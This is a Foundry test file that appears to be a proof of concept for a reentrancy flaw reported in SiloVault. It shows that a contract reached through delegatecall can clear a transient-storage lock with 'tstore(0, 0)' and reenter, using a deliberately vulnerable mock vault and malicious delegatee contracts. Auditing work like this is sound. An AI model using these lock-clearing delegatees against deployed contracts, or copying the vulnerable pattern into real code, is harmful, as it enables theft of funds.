// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console2} from "forge-std/Test.sol";

/// @title Proof that EIP-1153 transient storage can be manipulated through delegatecall
/// @dev This test proves the fundamental premise of the SiloVault vulnerability:
///      When a contract uses `bool transient _lock` for reentrancy protection,
///      and delegates execution to another contract via delegatecall,
///      the delegatee can clear the transient lock using `tstore(0, 0)`.
contract TransientStorageDelegatecallTest is Test {
    VaultWithTransientLock vault;
    MaliciousDelegatee maliciousDelegatee;
    HonestDelegatee honestDelegatee;

    function setUp() public {
        vault = new VaultWithTransientLock();
        maliciousDelegatee = new MaliciousDelegatee(address(vault));
        honestDelegatee = new HonestDelegatee();
    }

    /// @dev Proof 1: Transient lock works correctly with honest delegatecall
    function test_honestDelegatecallDoesNotBreakLock() public {
        vault.setDelegatee(address(honestDelegatee));

        // Enter the vault (sets transient lock, then delegatecalls)
        vault.enter();

        // The lock should still be active after honest delegatecall
        assertTrue(vault.reentrancyGuardEntered(), "Lock should be active after honest delegatecall");
    }

    /// @dev Proof 2: Malicious delegatecall CAN clear the transient lock
    function test_maliciousDelegatecallClearsLock() public {
        vault.setDelegatee(address(maliciousDelegatee));

        // Enter the vault (sets transient lock, then delegatecalls malicious code)
        vault.enter();

        // After malicious delegatecall, the lock is CLEARED
        assertFalse(vault.reentrancyGuardEntered(), "Lock should be cleared after malicious delegatecall");
    }

    /// @dev Proof 3: Reentrancy is possible after malicious delegatecall clears the lock
    function test_reentrancyAfterClearingLock() public {
        vault.setDelegatee(address(maliciousDelegatee));

        // This should succeed — the malicious delegatee clears the lock and reenters
        vault.protectedFunction();

        // Verify reentry happened
        assertEq(vault.reentryCount(), 1, "Should have reentered once");
    }

    /// @dev Proof 4: Multiple reentries are possible
    function test_multipleReentries() public {
        MultiReenterMalicious multiMalicious = new MultiReenterMalicious(address(vault), 3);
        vault.setDelegatee(address(multiMalicious));

        vault.protectedFunction();

        assertEq(vault.reentryCount(), 3, "Should have reentered 3 times");
    }
}

/// @dev A vault that uses transient storage for reentrancy protection
///      and delegatecalls to an external contract during protected functions
///      — mirrors the SiloVault pattern exactly
contract VaultWithTransientLock {
    bool transient _lock;
    address public delegatee;
    uint256 public reentryCount;

    function setDelegatee(address _delegatee) external {
        delegatee = _delegatee;
    }

    function reentrancyGuardEntered() external view returns (bool) {
        return _lock;
    }

    /// @dev Protected function that sets the lock and delegatecalls
    function protectedFunction() public {
        require(!_lock, "ReentrancyError");
        _lock = true;

        // Delegatecall to external contract (like _claimRewards in SiloVault)
        bytes memory data = abi.encodeWithSignature("doWork()");
        (bool success,) = delegatee.delegatecall(data);
        require(success, "Delegatecall failed");

        _lock = false;
    }

    function enter() public {
        require(!_lock, "ReentrancyError");
        _lock = true;

        // Delegatecall to external contract
        bytes memory data = abi.encodeWithSignature("doWork()");
        (bool success,) = delegatee.delegatecall(data);
        require(success, "Delegatecall failed");

        // Intentionally do NOT clear _lock here so we can check its state
    }

    /// @dev This function should be protected by the reentrancy guard
    function reenterMe() external {
        require(!_lock, "ReentrancyError: cannot reenter");
        _lock = true;

        reentryCount++;

        _lock = false;
    }
}

/// @dev Honest delegatee that does NOT touch transient storage
contract HonestDelegatee {
    function doWork() external pure {
        // Just do some honest work, don't touch transient storage
    }
}

/// @dev Malicious delegatee that CLEARS the transient lock and reenters
contract MaliciousDelegatee {
    address public immutable TARGET_VAULT;

    constructor(address _targetVault) {
        TARGET_VAULT = _targetVault;
    }

    function doWork() external {
        // Clear the transient lock — this is the core exploit!
        // `bool transient _lock` is at transient storage slot 0
        assembly {
            tstore(0, 0)
        }

        // Now reenter the vault — must call the VAULT address, not msg.sender
        // (in delegatecall, msg.sender is the original caller, not the vault)
        VaultWithTransientLock(TARGET_VAULT).reenterMe();
    }
}

/// @dev Malicious delegatee that reenters multiple times
///      Uses immutable variables (stored in code, not storage) to track state
contract MultiReenterMalicious {
    address public immutable TARGET_VAULT;
    uint256 public immutable MAX_COUNT;

    constructor(address _targetVault, uint256 _maxCount) {
        TARGET_VAULT = _targetVault;
        MAX_COUNT = _maxCount;
    }

    function doWork() external {
        // Clear the lock
        assembly {
            tstore(0, 0)
        }

        // Reenter MAX_COUNT times — each reentry sets _lock=true,
        // but then we clear it again in the next delegatecall
        for (uint256 i; i < MAX_COUNT; i++) {
            try VaultWithTransientLock(TARGET_VAULT).reenterMe() {
                // Success — reentry worked
            } catch {
                // Failed — lock might still be set
                break;
            }
        }
    }
}
